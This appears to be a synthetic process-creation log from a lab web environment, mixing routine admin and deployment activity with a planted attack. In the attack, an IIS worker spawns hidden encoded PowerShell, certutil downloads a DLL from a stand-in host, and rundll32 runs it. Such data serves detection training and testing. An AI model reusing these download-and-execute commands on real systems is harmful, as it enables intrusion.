_time,host,user,process_name,process_id,parent_process_name,parent_process_id,command_line,session_type,signature_status
2026-07-14T13:58:12Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,w3wp.exe,4120,services.exe,756,C:\Windows\System32\inetsrv\w3wp.exe -ap DefaultAppPool,service,signed
2026-07-14T14:00:12Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,conhost.exe,7512,w3wp.exe,4120,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,service,signed
2026-07-14T14:01:12Z,WEB-EDGE-02,NT AUTHORITY\SYSTEM,w3wp.exe,3920,services.exe,744,C:\Windows\System32\inetsrv\w3wp.exe -ap DefaultAppPool,service,signed
2026-07-14T14:02:09Z,WEB-EDGE-01,IIS APPPOOL\DefaultAppPool,cmd.exe,7784,w3wp.exe,4120,cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <redacted>,service,signed
2026-07-14T14:02:10Z,WEB-EDGE-01,IIS APPPOOL\DefaultAppPool,powershell.exe,7932,cmd.exe,7784,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <redacted>,service,signed
2026-07-14T14:02:18Z,WEB-EDGE-01,IIS APPPOOL\DefaultAppPool,certutil.exe,8016,powershell.exe,7932,certutil.exe -urlcache -split -f https://cdn-sync.example/assets/v3.dat C:\ProgramData\IISCache\version.dll,service,signed
2026-07-14T14:02:25Z,WEB-EDGE-01,IIS APPPOOL\DefaultAppPool,rundll32.exe,8128,powershell.exe,7932,"rundll32.exe C:\ProgramData\IISCache\version.dll,Start",service,signed
2026-07-14T14:03:00Z,WEB-EDGE-02,NT AUTHORITY\SYSTEM,powershell.exe,6332,services.exe,744,powershell.exe -NoProfile -File C:\Program Files\WebLab\Warmup-AppPool.ps1,service,signed
2026-07-14T14:03:07Z,WEB-EDGE-02,NT AUTHORITY\SYSTEM,appcmd.exe,6388,powershell.exe,6332,appcmd.exe recycle apppool /apppool.name:DefaultAppPool,service,signed
2026-07-14T14:04:11Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,powershell.exe,8524,services.exe,756,powershell.exe -NoProfile -File C:\Program Files\Monitoring\Collect-WebCounters.ps1,service,signed
2026-07-14T14:04:14Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,typeperf.exe,8572,powershell.exe,8524,"typeperf.exe ""\Processor(_Total)\% Processor Time"" -sc 1",service,signed
2026-07-14T14:05:02Z,MONITOR-01,NT AUTHORITY\SYSTEM,powershell.exe,4420,services.exe,704,powershell.exe -NoProfile -File C:\Program Files\Monitoring\Poll-WebStatus.ps1,service,signed
2026-07-14T14:06:45Z,WEB-EDGE-01,WEBLAB\admin.jlee,powershell.exe,9344,explorer.exe,3660,powershell.exe -NoProfile -File C:\Ops\Collect-IISHealth.ps1,interactive,signed
2026-07-14T14:06:47Z,WEB-EDGE-01,WEBLAB\admin.jlee,wevtutil.exe,9408,powershell.exe,9344,wevtutil.exe qe Application /c:20 /f:text,interactive,signed
2026-07-14T14:07:40Z,SVC-SCAN-01,svc_scan,python3,2104,systemd,1,python3 /opt/scanner/http_probe.py --target WEB-EDGE-01,service,signed
2026-07-14T14:09:05Z,BACKUP-01,NT AUTHORITY\SYSTEM,powershell.exe,5224,services.exe,700,powershell.exe -NoProfile -File C:\Program Files\Backup\Snapshot-WebConfig.ps1,service,signed
2026-07-14T14:09:18Z,BACKUP-01,NT AUTHORITY\SYSTEM,robocopy.exe,5312,powershell.exe,5224,robocopy.exe \\WEB-EDGE-01\c$\inetpub C:\Backups\WEB-EDGE-01 /MIR /XD logs,service,signed
2026-07-14T14:10:03Z,ADMIN-WS-07,WEBLAB\admin.jlee,powershell.exe,6124,explorer.exe,2780,powershell.exe Get-ChildItem \\WEB-EDGE-01\c$\Windows\Temp,interactive,signed
2026-07-14T14:11:19Z,WEB-EDGE-01,WEBLAB\svc_webdeploy,msdeploy.exe,9570,services.exe,756,msdeploy.exe -verb:sync -source:package=WebLab.zip -dest:auto,service,signed
2026-07-14T14:11:21Z,WEB-EDGE-01,WEBLAB\svc_webdeploy,cmd.exe,9604,msdeploy.exe,9570,cmd.exe /c echo deployment-complete > C:\Windows\Temp\deploy-status.txt,service,signed
2026-07-14T14:12:01Z,APP-API-02,NT AUTHORITY\SYSTEM,powershell.exe,5140,services.exe,744,powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Deploy\install-agent.ps1,service,signed
2026-07-14T14:12:08Z,APP-API-02,NT AUTHORITY\SYSTEM,msiexec.exe,5264,powershell.exe,5140,msiexec.exe /i C:\ProgramData\Deploy\company-agent.msi /qn,service,signed
2026-07-14T14:13:20Z,WEB-EDGE-01,NT AUTHORITY\SYSTEM,powershell.exe,9960,taskeng.exe,1480,powershell.exe -NoProfile -File C:\Program Files\WebLab\RotateLogs.ps1,scheduled,signed
2026-07-14T14:14:10Z,DEV-BUILD-03,WEBLAB\svc_build,powershell.exe,7120,vsts-agent.exe,2500,powershell.exe -ExecutionPolicy Bypass -File C:\Build\Publish-WebArtifacts.ps1,service,signed
